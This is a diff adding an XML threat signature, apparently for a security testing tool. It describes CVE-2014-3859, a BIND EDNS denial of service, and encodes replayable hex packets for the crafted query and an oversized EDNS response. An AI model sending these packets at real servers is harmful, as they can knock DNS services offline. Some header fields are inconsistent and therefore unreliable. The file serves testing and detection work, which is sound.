@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ISC BIND EDNS Option Processing Denial of Service IPv6  version"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in ISC BIND. The vulnerability is caused by an assertion failure when processing the EDNS option. A remote attacker may exploit this vulnerability by sending a specially crafted query to the affected servers. Successful exploitation would result in the BIND service terminating unexpectedly."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="DNS.IPV6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="ISC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="BIND"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="9.10.0/9.10.0-P1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140613-02"/>
+    <CVEID display="true" value="CVE-2014-3859"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107999"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="93e9ba3229b723496553d4db06e6379a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="NONE"/>
+    <IntegImpact display="false" value="NONE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635448299630162886"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <UDP srcPort="26312" destPort="$DNSdestPort" checksum="3DFE" length="003A" Payload="7FF1010000010000000000011174656C757373656375726974796C61627303636F6D00000100010000290200000080000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <UDP srcPort="$DNSdestPort" destPort="26312" checksum="FB68" length="0135" Payload="7FF1858000010001000000011174656C757373656375726974796C61627303636F6D00000100011174656C757373656375726974796C61627303636F6D000001000100093A800004AC1008E600002910000000000000D6000300D2414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
